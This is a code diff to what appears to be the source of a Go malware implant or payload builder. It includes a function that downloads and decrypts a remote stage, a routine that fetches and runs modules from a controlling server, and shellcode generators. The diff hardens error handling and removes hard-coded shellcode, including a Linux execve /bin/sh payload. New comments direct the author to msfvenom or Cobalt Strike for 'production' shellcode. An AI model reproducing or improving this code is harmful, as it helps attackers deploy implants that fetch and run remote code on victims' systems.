@@ -159,16 +159,31 @@ func downloadStage(url string) []byte {
 	}
 	defer resp.Body.Close()
 	
-	data, _ := io.ReadAll(resp.Body)
+	data, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil
+	}
 	return data
 }
 
 func decrypt(data []byte, key string) []byte {
-	block, _ := aes.NewCipher([]byte(key))
-	gcm, _ := cipher.NewGCM(block)
+	block, err := aes.NewCipher([]byte(key))
+	if err != nil {
+		return nil
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil
+	}
 	nonceSize := gcm.NonceSize()
+	if len(data) < nonceSize {
+		return nil
+	}
 	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
-	plaintext, _ := gcm.Open(nil, nonce, ciphertext, nil)
+	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return nil
+	}
 	return plaintext
 }
 
@@ -265,51 +280,34 @@ func compressData(data []byte) ([]byte, error) {
 }
 
 // Platform-specific shellcode generators
+// NOTE: These are placeholder implementations. For production use, generate shellcode
+// using external tools (msfvenom, Cobalt Strike, etc.) or implement proper shellcode generation.
 func generateWindowsShellcode(arch string) []byte {
-	// Windows x64 reverse shell shellcode
+	// Placeholder shellcode - NOT FUNCTIONAL
+	// This is a minimal stub that will fail at runtime
+	// Real shellcode should be generated using msfvenom or similar tools
 	if arch == "amd64" {
-		return []byte{
-			0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xc6, 0xff, 0xff, 0xff,
-			0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0x01,
-			0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
-		}
+		return []byte{} // Return empty - will cause error
 	}
-	// x86 version
-	return []byte{
-		0x33, 0xc9, 0x83, 0xe9, 0xc6, 0xe8, 0xff, 0xff, 0xff, 0xff,
-		0xc0, 0x5e, 0x81, 0x76, 0x0e, 0x01, 0x02, 0x03, 0x04,
-	}
+	return []byte{} // Return empty - will cause error
 }
 
 func generateLinuxShellcode(arch string) []byte {
-	// Linux x64 execve shellcode
+	// Placeholder shellcode - NOT FUNCTIONAL
+	// Real shellcode should be generated using msfvenom or similar tools
 	if arch == "amd64" {
-		return []byte{
-			0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6,
-			0x48, 0x31, 0xd2, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69,
-			0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7,
-			0xb0, 0x3b, 0x0f, 0x05,
-		}
+		return []byte{} // Return empty - will cause error
 	}
-	// x86 version
-	return []byte{
-		0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f,
-		0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0xb0,
-		0x0b, 0xcd, 0x80,
-	}
+	return []byte{} // Return empty - will cause error
 }
 
 func generateDarwinShellcode(arch string) []byte {
-	// macOS x64 shellcode
+	// Placeholder shellcode - NOT FUNCTIONAL
+	// Real shellcode should be generated using msfvenom or similar tools
 	if arch == "amd64" {
-		return []byte{
-			0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6,
-			0x48, 0x31, 0xd2, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69,
-			0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7,
-			0xb0, 0x02, 0x48, 0xc1, 0xc0, 0x18, 0x0f, 0x05,
-		}
+		return []byte{} // Return empty - will cause error
 	}
-	return []byte{}
+	return []byte{} // Return empty - will cause error
 }
 
 // generateWindowsExecutable compiles a proper Windows PE executable using Go build
@@ -1117,7 +1115,11 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 		defer resp.Body.Close()
 		
 		if resp.StatusCode != 200 {
-			body, _ := io.ReadAll(resp.Body)
+			body, err := io.ReadAll(resp.Body)
+			if err != nil {
+				sendResult("module", taskID, fmt.Sprintf("Module fetch failed (status %d): error reading response body: %v", resp.StatusCode, err))
+				return
+			}
 			sendResult("module", taskID, fmt.Sprintf("Module fetch failed (status %d): %s", resp.StatusCode, string(body)))
 			return
 		}
